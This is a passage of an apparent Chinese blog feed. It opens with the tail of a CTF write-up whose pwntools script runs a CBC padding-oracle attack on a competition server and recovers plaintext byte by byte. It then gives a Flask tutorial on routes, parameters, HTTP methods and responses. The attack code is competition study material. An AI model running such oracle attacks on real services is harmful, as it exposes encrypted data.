<span class="number">1</span>):</span><br><span class="line">        padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>]  <span class="comment"># 再计算j+1的pad</span></span><br><span class="line">        <span class="comment">#print(padd2)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span> - j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">        <span class="comment">#print(&quot;text1---&gt;&quot;, text1)</span></span><br><span class="line">        t = xor(block1[<span class="number">16</span> - j:], text1.encode())  <span class="comment"># 先计算C_i-1[j]^P_n[j], 相比于前面这里去掉了padd</span></span><br><span class="line">        t2 = xor(t, padd2)  <span class="comment"># 最终计算得到C_i-1[j]^P_n[j]^(L+1)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[j+<span class="number">1</span>]:</span><br><span class="line">            payload = block1[:<span class="number">15</span> - j]  <span class="comment"># C_i-1[15-L]前面的数据不要动</span></span><br><span class="line">            payload += xor(block1[<span class="number">15</span> - j], i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)) + t2  <span class="comment"># 组合成第C_i-1密文块</span></span><br><span class="line">            payload += block2  <span class="comment"># 加上尾块</span></span><br><span class="line">            payload = payload.<span class="built_in">hex</span>().encode()  <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">            <span class="comment">#print(len(payload))</span></span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>, payload)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">            rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            <span class="comment">#print(rec)</span></span><br><span class="line">            <span class="keyword">if</span> rec == <span class="string">&#x27;True&#x27;</span>:  <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">                <span class="comment">#print(&quot;find---&gt;&quot;, xor(i.to_bytes(1, &#x27;big&#x27;), j + 1))  # 爆破到明文</span></span><br><span class="line">                text = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), j + <span class="number">1</span>).decode() + text  <span class="comment"># 添加到text中</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>, text)</span><br><span class="line">                text1 = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), j + <span class="number">1</span>).decode() + text1</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;text--&gt;&#x27;</span>,text)</span><br><span class="line">    <span class="keyword">return</span> text1</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;grandforge-of-face-melting-tschunk.gpn23.ctf.kitctf.de&quot;</span>, <span class="string">&quot;443&quot;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Welcome to the Pad Server!\n&#x27;</span>)</span><br><span class="line">    c1 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c1 = &#x27;</span>,c1)</span><br><span class="line">    iv_c2 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(iv_c2)</span><br><span class="line">    iv = iv_c2[:<span class="number">32</span>]</span><br><span class="line">    c2 = iv_c2[<span class="number">32</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>,c2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;iv=&#x27;</span>,iv)</span><br><span class="line">    l = <span class="built_in">len</span>(c2)</span><br><span class="line">    ll = l//<span class="number">32</span></span><br><span class="line">    <span class="built_in">print</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(l//<span class="number">32</span>)</span><br><span class="line">    c_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ll):</span><br><span class="line">        c_list.append(c2[i*<span class="number">32</span>:i*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">    <span class="built_in">print</span>(c_list)</span><br><span class="line">    <span class="built_in">print</span>(my_bytes(c_list[-<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;block_length---&gt;&#x27;</span>,<span class="built_in">len</span>(c_list))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c_list)&lt;=<span class="number">40</span>: <span class="comment"># 选择块总数＜=40的消息进行爆破,从而减少时间</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># 确定padding长度</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    block1 = my_bytes(c_list[-<span class="number">2</span>])</span><br><span class="line">    block2 = my_bytes(c_list[-<span class="number">1</span>])</span><br><span class="line">    payload = (block1[:i]+xor(block1[i],<span class="string">b&#x27;\x10&#x27;</span>)+block1[i+<span class="number">1</span>:]+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">    rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="comment">#print(rec)</span></span><br><span class="line">    <span class="keyword">if</span> rec==<span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        padding=<span class="number">0x10</span>-i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#print(&quot;padding----&gt;&quot;,padding)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解尾块的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(padding,<span class="number">16</span>,<span class="number">1</span>):</span><br><span class="line">    padd = pad(padding) <span class="comment"># 先计算原始padd</span></span><br><span class="line">    padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>] <span class="comment"># 再计算j+1的pad</span></span><br><span class="line">    <span class="comment">#print(padd2)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span>-j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">    t = xor(block1[<span class="number">16</span>-j:],text.encode()+padd) <span class="comment"># 先计算C_i-1[j]^P_n[j]</span></span><br><span class="line">    t2 = xor(t,padd2) <span class="comment"># 最终计算得到C_i-1[j]^P_n[j]^(L+1)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a[j+<span class="number">1</span>]:</span><br><span class="line">        payload = block1[:<span class="number">15</span>-j]  <span class="comment"># C_i-1[15-L]前面的数据不要动</span></span><br><span class="line">        payload +=xor(block1[<span class="number">15</span>-j],i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))+t2 <span class="comment"># 组合成第C_i-1密文块</span></span><br><span class="line">        payload +=block2    <span class="comment">#加上尾块</span></span><br><span class="line">        payload = payload.<span class="built_in">hex</span>().encode() <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">        <span class="comment">#print(len(payload))</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="comment">#print(rec)</span></span><br><span class="line">        <span class="keyword">if</span> rec==<span class="string">&#x27;True&#x27;</span>: <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">            <span class="comment">#print(&quot;find---&gt;&quot;,xor(i.to_bytes(1,&#x27;big&#x27;),j+1)) # 爆破到明文</span></span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>).decode() + text <span class="comment"># 添加到text中</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>,text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(c_list)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>),leave=<span class="string">&#x27;true&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;block<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i&gt;=<span class="number">1</span>:</span><br><span class="line">        attack_other_block(c_list[i-<span class="number">1</span>],c_list[i])</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">0</span>:</span><br><span class="line">        attack_other_block(iv,c_list[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;text:&#x27;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;encrypt_flag:&#x27;</span>,c1)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：暑假复现了两题，感觉太少了没发（有碎碎念）</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>Python-flask框架开发</title>
    <link href="http://iyheart.github.io/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/"/>
    <id>http://iyheart.github.io/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/</id>
    <published>2025-09-02T00:47:37.000Z</published>
    <updated>2025-09-03T07:55:24.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask开发规范">flask开发规范</h1><h2 id="hello_world">Hello_world</h2><p>对于flask框架的开发，一般都是遵循着如下格式模版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902223748762.png" alt="image-20250902223748762"></p><h2 id="路由规范">路由规范</h2><ol><li>路由定义的路径名称应尽量与其绑定的函数名称应该<strong>尽量相同</strong></li></ol><h2 id="项目目录">项目目录</h2><ul><li>对于一个比较复杂的项目结构，该结构的目录如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">my_flask_app/</span><br><span class="line">│</span><br><span class="line">├── app/ </span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── routes/  <span class="comment"># 路由逻辑</span></span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   ├── main.py</span><br><span class="line">│   │   └── auth.py</span><br><span class="line">│   ├── models/    <span class="comment"># 数据库模型</span></span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   └── user.py</span><br><span class="line">│   ├── templates/<span class="comment"># 前端展示相关</span></span><br><span class="line">│   │   ├── layout.html</span><br><span class="line">│   │   └── home.html</span><br><span class="line">│   └── static/<span class="comment"># 前端展示相关</span></span><br><span class="line">│       ├── css/</span><br><span class="line">│       └── js/</span><br><span class="line">│</span><br><span class="line">├── config.py<span class="comment"># 配置</span></span><br><span class="line">├── requirements.txt<span class="comment"># 项目依赖</span></span><br><span class="line">├── migrations/<span class="comment"># 数据库版本管理</span></span><br><span class="line">│   └── ...</span><br><span class="line">└── run.py<span class="comment"># 程序启动文件</span></span><br></pre></td></tr></table></figure><h1 id="flask路由">flask路由</h1><ul><li>在flask中路由并不是指网络层的那些东西，而是web应用将<code>URL映射</code>到<code>python</code>函数的机制。flask路由是flask应用的核心部分，用于处理不同的<code>URL</code>的请求，并将请求的处理委托给相应的视图函数。</li><li>下面是关于Flask路由的详细说明：<ul><li>定义路由：<code>@app.route(&quot;/path&quot;)</code>装饰器定义URL和视图函数的映射。</li><li>路由参数：通过动态部分在<code>URL</code>中传递参数</li><li>路由规则：使用类型转换器指定URL参数传递的类型，字符串、整数、浮点数、路径。</li><li>请求方法：指定允许的HTTP请求方法。</li><li>路由函数返回：视图函数可以返回不同的类型响应。</li><li>静态文件和模版：管理静态文件和动态渲染HTML模版。</li><li>路由优先级：确保路由顺序正确，以避免意外匹配结果。</li></ul></li></ul><h2 id="定义路由">定义路由</h2><p>路由的定义其实就是如下两步：</p><ul><li>第一步先在一行中写上<code>@app.route(&quot;/path&quot;)</code>。</li><li>第二步紧接着定义一个函数，这个函数被称为<strong>视图函数</strong>，例子就用<code>hello_world</code>的这个例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><h2 id="参数接收">参数接收</h2><ul><li>在定义路由的时候定义这样的形式：<code>@app.route('/say/&lt;name&gt;')</code>，这就是表示将<code>URL</code>请求的一些路径参数传递给函数，这个<code>name</code>其实是一个变量名称。</li><li>当使用<code>URL</code>访问<code>/say/xxx</code>，此时<code>name=xxx</code>就会作为参数传递给其绑定的函数，所以路由绑定的函数就会存在<code>name</code>这个参数，而这个<code>xxx</code>是被用户决定的。</li><li>例子：对于如下代码，当我们访问<code>/say/aaa</code>，<code>name='aaa'</code>，此时就会返回<code>hello aaa</code>；如果访问<code>/say/bbb</code>，此时就会返回<code>hello bbb</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/say/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225006459.png" alt="image-20250902225006459"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225103185.png" alt="image-20250902225103185"></p><h2 id="路由规则">路由规则</h2><ul><li>对于参数的接收可以指定一个规则，使得接收的参数为整型会绑定一个函数，接收的参数为字符串类型会绑定另一个函数。这个规则的定义如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;int:number&gt;&quot;</span></span>) </span><span class="comment"># &lt;数据类型:变量名&gt;</span></span><br></pre></td></tr></table></figure><ul><li>例子如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;int:number&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">type1</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;int,<span class="subst">&#123;number&#125;</span>&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/type/&lt;string:strs&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">type2</span>(<span class="params">strs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;str,<span class="subst">&#123;strs&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225722918.png" alt="image-20250902225722918"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902225735722.png" alt="image-20250902225735722"></p><h2 id="请求方法">请求方法</h2><ul><li><p>这里的请求方法指的是<code>http</code>协议的请求方法，常见的<code>http</code>协议的请求方法有：<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>。这里指简单介绍<code>GET</code>请求和<code>POST</code>请求。</p></li><li><p>定义的形式如下：选定传入的参数为<code>methods</code>，<code>methods</code>为一个列表类型，它需要指定为接收的方法类型，比如只处理get请求，就只写<code>['GET']</code>；如果需要处理get、post请求，就需要写<code>['GET','POST']</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br></pre></td></tr></table></figure><ul><li>例子如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这是一个get请求&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post&quot;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这是一个post请求&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902230653213.png" alt="image-20250902230653213"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902231047893.png" alt="image-20250902231047893"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902232053306.png" alt="image-20250902232053306"></p><h2 id="视图函数返回">视图函数返回</h2><p>视图函数的返回可以返回<code>字符串、html、标签、json文件、自定义请求响应</code>，这里直接从例子入手。</p><ul><li>例子1：返回<code>json</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/json&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_func</span>():</span><br><span class="line">    dicts=<span class="built_in">dict</span>()</span><br><span class="line">    dicts[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;tome&quot;</span></span><br><span class="line">    dicts[<span class="string">&quot;age&quot;</span>] = <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> flask.jsonify(dicts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233706687.png" alt="image-20250902233706687"></p><ul><li>例子2：返回<code>字符串</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/str&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;strs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233815127.png" alt="image-20250902233815127"></p><ul><li>例子3：返回<code>html</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;html&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233914436.png" alt="image-20250902233914436"></p><ul><li>例子4：返回自定义请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/response&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_func</span>():</span><br><span class="line">    response=flask.Response(<span class="string">&quot;defi response&quot;</span>,status=<span class="number">200</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;definiresponse&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 